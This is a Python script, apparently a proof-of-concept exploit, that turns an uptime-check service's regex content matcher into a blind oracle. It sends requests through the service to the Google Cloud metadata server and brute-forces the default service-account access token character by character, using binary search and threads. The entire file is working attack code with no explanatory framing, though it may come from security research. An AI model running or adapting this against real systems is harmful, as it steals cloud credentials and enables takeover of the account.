import requests
import json
import string
from concurrent.futures import ThreadPoolExecutor as PoolExecutor
from threading import Thread

SPECIAL_CHARACTERS = '.-_'

def send_request(cm, path='/computeMetadata/v1/instance/service-accounts/default/token'):
    """
    sends request with content_matcher as the parameter and returns if there was a match or not
    """
    body = {
        "contentMatchers": [
            {
                "content": cm,
                "matcher": "MATCHES_REGEX"
            }
        ],
        "displayName": "test",
        "httpCheck": {
            "path": path,
            "port": 80,
            "requestMethod": "GET",
            "useSsl": False,
            "headers": {"Metadata-Flavor": "Google"}
        },
        "monitoredResource": {
            "host": "metadata.google.internal"
        }
    }
    resp = requests.post('http://127.0.0.1:8000/uptime_check', json=body)
    result = resp.json()['uptimeCheckResults'][0]['checkPassed']
    return result

def send_requests_till_successful(cm_positive, cm_negative):
    """
    sends request with both positive and negative match. If there's a positive, then the next brute-forced character is correct. If there's a negative match, the next brute-forced character is not correct. If there's none, send both requests again.
    """
    while True:
        result_postivie = send_request(cm_positive)
        result_negative = send_request(cm_negative)
        if result_postivie:
            return True
        if result_negative:
            return False



def identify_type(known):
    """
    idenfity in which range the next character is
    """
    cm_lowercase = f'{known}[a-z]'
    cm_lowercase_negative = f'{known}[^a-z]'
    cm_uppercase = f'{known}[A-Z]'
    cm_uppercase_negative = f'{known}[^A-Z]'
    cm_digits = f'{known}[0-9]'
    cm_digits_negative = f'{known}[^0-9]'
    cm_special = f'{known}[\.\-_]'
    cm_special_negative = f'{known}[^\.\-_]'

    result_lowercase = send_requests_till_successful(cm_lowercase, cm_lowercase_negative)
    if result_lowercase:
        return string.ascii_lowercase

    result_uppercase = send_requests_till_successful(cm_uppercase, cm_uppercase_negative)
    if result_uppercase:
        return string.ascii_uppercase

    result_digits = send_requests_till_successful(cm_digits, cm_digits_negative)
    if result_digits:
        return string.digits

    result_special = send_requests_till_successful(cm_special, cm_special_negative)
    if result_special:
        return SPECIAL_CHARACTERS

    return None


def split_charset(charset):
    """
    split charset in halves for binary search purposes
    """
    l = len(charset)
    return charset[:l//2], charset[l//2:]


def create_content_matcher(known, charset):
    """
    returns positive content matcher, negative content matcher, current charset (basically what characters can be matched by positive content matcher), remaining charset (basically what characters can be matched by negative content matcher)
    """
    # those special characters are irritating 
    if '.' in charset or '-' in charset or '_' in charset:
        return f'{known}\\{charset[0]}', f'{known}[^\\{charset[0]}]', charset[0], charset[1:]

    # if there's only one character left, it means we either got the correct one, or we need to do the binary search again
    if len(charset) == 1:
        return f'{known}{charset}', f'{known}[^{charset}]', charset, None
    
    charset_low, charset_high = split_charset(charset)
    return f'{known}[{charset_low[0]}-{charset_low[-1]}]', f'{known}[^{charset_low[0]}-{charset_low[-1]}]', charset_low, charset_high


def try_find_next_char(known, charset):
    """
    this function does pretty much most of the binary search. At the beginning of the token, there might be collisions with other instances, so that's why it's wrapped up in while loop
    """
    if charset is None:
        return None
    cm_positive, cm_negative, current_charset, remaining_charset = create_content_matcher(known, charset)

    result = send_requests_till_successful(cm_positive, cm_negative)
    if result:
        # we are at the end of the binary search, probing single character
        if remaining_charset is None or len(remaining_charset) == 0:
            return cm_positive
        else:
            # we probed correct range and we go down the binary search
            return try_find_next_char(known, current_charset)
    else:
        # we probed wrong charset, trying the other one 
        return try_find_next_char(known, remaining_charset)
    
    return '"'

def get_next_character(known, results=None, index=None):
    """
    The function returns the next character. results and index are used with multithreading - the result will also be saved in results[index] array
    """
    # if the next char matches [a-z] charset is abcdefghijk...z and so on
    charset = identify_type(known)
    if charset is None:
        return ''
    next_char = None
    while next_char is None:
        # next char is actually the whole known token (with .... wildcards possiblt)
        next_char = try_find_next_char(known, charset)
    print(next_char)

    # fill the results table if there's one
    if results is not None and index is not None:
        results[index] = next_char[-1]
    return next_char[-1]


def get_next_n_characters(known, n):
    """
    at the beginning, fills knowns array with . and fills it using get_next_character function. Returns the whole token with results from all n threads
    """
    knowns = [known + '.' * i for i in range(n)]
    threads = [None] * n
    results = [None] * n
    for i in range(n):
        threads[i] = Thread(target=get_next_character, args=(knowns[i], results, i))
        threads[i].start()
    for i in range(len(threads)):
        threads[i].join()

    return known + ''.join(results)


def get_token():
    known = '\\{"access_token":"'
    single_threaded = len(known) + 10
    # the beginning is bruteforced single threaded to avoid collisions. This parameter can be modified from 10 to more if necessary
    key_length = 64
    whole_token = len(known) + key_length + 1
    max_threads = 10

    # getting the beginning
    while len(known) < single_threaded:
        known += get_next_character(known)
        print(known)
    
    # n is usually max_threads, but at the end, where there's less characters to leak than max_threads, remaining is used
    remaining = whole_token - len(known) - 1
    while remaining > 0:
        n = min(max_threads, remaining)
        known = get_next_n_characters(known, n)
        print(known)
        remaining -= n


if __name__ == '__main__':
    get_token()